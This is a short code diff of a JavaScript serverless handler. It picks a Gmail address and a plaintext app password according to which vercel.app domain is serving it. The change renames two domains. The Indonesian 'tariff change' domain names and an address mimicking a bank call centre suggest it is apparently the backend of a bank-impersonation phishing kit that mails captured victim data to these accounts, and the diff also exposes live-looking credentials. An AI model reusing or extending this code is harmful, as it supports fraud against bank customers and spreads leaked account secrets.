@@ -16,7 +16,7 @@ export default function handler(req, res) {
         email = 'angga13zx@gmail.com' ;
         pass = 'szssfkfwyhtjtbkg' ;
         
-    } else if(url == 'tarif--perubahan--barulama.vercel.app'){
+    } else if(url == 'tarif-perubahan-barulama.vercel.app'){
         email = 'samsudin19.01.12@gmail.com';
         pass = 'nsozbvpgogzlfeqg';
 
@@ -32,7 +32,7 @@ export default function handler(req, res) {
         email = 'callbribricoid66@gmail.com';
         pass = 'imuujsgssprgrtue';
 
-    } else if(url == 'ubah--tariff-baru-lama.vercel.app'){
+    } else if(url == 'ubahh-tariff-baru-lama.vercel.app'){
         email = 'andarasultan954@gmail.com';
         pass = 'xwjfzwdtiaxfname';
 
